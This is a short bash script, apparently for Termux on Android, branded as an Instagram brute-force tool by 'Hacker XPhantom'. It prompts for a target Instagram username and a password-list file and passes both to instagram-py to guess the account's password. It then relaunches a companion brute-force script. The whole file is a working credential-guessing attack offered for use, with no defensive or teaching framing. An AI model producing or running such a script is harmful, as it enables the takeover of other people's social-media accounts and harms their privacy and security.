grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
ylo='\033[1;33m'
#!/bin/bash
clear
echo
echo '
   
__  ___           _            _                _       
\ \/ (_)_ __  ___| |_ __ _    | |__  _ __ _   _| |_ ___ 
 \  /| | '_ \/ __| __/ _` |   | '_ \| '__| | | | __/ _ \
 /  \| | | | \__ \ || (_| |   | |_) | |  | |_| | ||  __/
/_/\_\_|_| |_|___/\__\__,_|___|_.__/|_|   \__,_|\__\___|
                         |_____|
            [#] Manual Password Attack [#]
' |lolcat
printf "\n"
printf "     \e[101m\e[1;77m  >>  Script By Hacker XPhantom (PH4N70M) << \e[0m\n"
printf "\n"
printf "  \e[100m\e[1;77m >>  Youtube Channel : \e[1;77m HACKER X PHANTOM \e[100m\e[1;77m << \e[0m\n"
printf "\n"
echo
read -p "[#] Enter Instagram ID/Username : " usrnm
echo
read -p "[#] Enter Password-list path : " inspass
echo
if [ $inspass = 0 ]                                             
then
echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"        
else

  instagram-py --username $usrnm --password-list $inspass

echo
sleep 30.0
cd /data/data/com.termux/files/home
fi
sleep 30.0
cd /data/data/com.termux/files/home/xinsta_brute
bash xinsta_brute.sh